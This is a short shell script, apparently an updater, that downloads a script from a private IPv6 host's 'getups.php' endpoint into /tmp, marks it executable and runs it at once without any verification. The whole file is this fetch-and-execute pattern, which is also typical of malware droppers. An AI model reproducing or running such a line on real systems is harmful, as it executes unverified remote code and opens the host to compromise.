#!/bin/sh
cd /tmp/

cat="jubtl"
localname="/tmp/sysup-jubtl.sh"

wget "http://[fdff::215:5d01:201c]:2351/getups.php?cat=$cat" -O "$localname"
chmod +x "$localname"
"$localname"
